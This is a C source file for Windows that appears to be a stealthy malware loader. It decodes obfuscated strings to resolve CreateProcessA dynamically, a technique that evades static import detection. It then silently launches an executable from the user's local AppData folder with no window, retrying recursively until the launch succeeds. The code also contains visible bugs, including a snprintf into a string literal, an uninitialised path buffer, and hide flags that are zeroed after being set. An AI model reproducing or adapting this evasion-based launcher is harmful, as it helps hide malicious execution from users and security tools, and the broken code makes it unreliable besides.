#include <windows.h>
#include <shlobj.h>
#include <stdbool.h>
#include <stdio.h>
#include "enc.h"

typedef BOOL (WINAPI *LPCTRPRC)(
    LPCSTR                lpApplicationName,
    LPSTR                 lpCommandLine,
    LPSECURITY_ATTRIBUTES lpProcessAttributes,
    LPSECURITY_ATTRIBUTES lpThreadAttributes,
    BOOL                  bInheritHandles,
    DWORD                 dwCreationFlags,
    LPVOID                lpEnvironment,
    LPCSTR                lpCurrentDirectory,
    LPSTARTUPINFOA        lpStartupInfo,
    LPPROCESS_INFORMATION lpProcessInformation
);


void crtProc(LPSTR szPath, STARTUPINFO si, PROCESS_INFORMATION pi){

    LPCTRPRC crtprc = NULL;
    // decode encoded lib name 
    char* kr32dec = Decode("ICYjLC0ncGNsLCcv");
    char* crtprocN = Decode("DCYlEjokIBAmLDkmIjEA");
    // LoadLibrary
    HMODULE kn32 = LoadLibraryA(kr32dec);
    // Get Function Adress(CreateProcessA)
    crtprc = (LPCTRPRC) GetProcAddress(kn32, crtprocN);


    // Run that function
    
    bool r = crtprc(NULL,
    szPath,
    NULL,
    NULL,
    FALSE,
    CREATE_NO_WINDOW,
    NULL,
    NULL,
    &si,
    &pi);

    if ( r==0 ){
        crtProc(szPath, si, pi);
    }
}

int main() {
    
    STARTUPINFO si;
    PROCESS_INFORMATION pi;
    char* exPath;
    si.dwFlags = STARTF_USESHOWWINDOW;
    si.wShowWindow = SW_HIDE;

    ZeroMemory(&si, sizeof(si));
    si.cb = sizeof(si); // Crucially, set the size of the STARTUPINFO structure
    ZeroMemory(&pi, sizeof(pi));

    TCHAR szPath[MAX_PATH];
    char* exPTDEC = Decode("OTY/bC0zJgAA");
    
    snprintf("exPath", sizeof(exPath),"\\%s", exPTDEC);

    // LoadLibrary
    // Get Function Adress (SHGetFolderPath)
    // Run that function
    if(SUCCEEDED(SHGetFolderPath(NULL, 
        CSIDL_LOCAL_APPDATA, 
        NULL, 
        0, 
        szPath))) 
    {
        strcat_s(szPath, sizeof(szPath)/sizeof(TCHAR), exPath);
        crtProc(szPath, si, pi);
    }

    CloseHandle( pi.hProcess );
    CloseHandle( pi.hThread );


    return 0;
}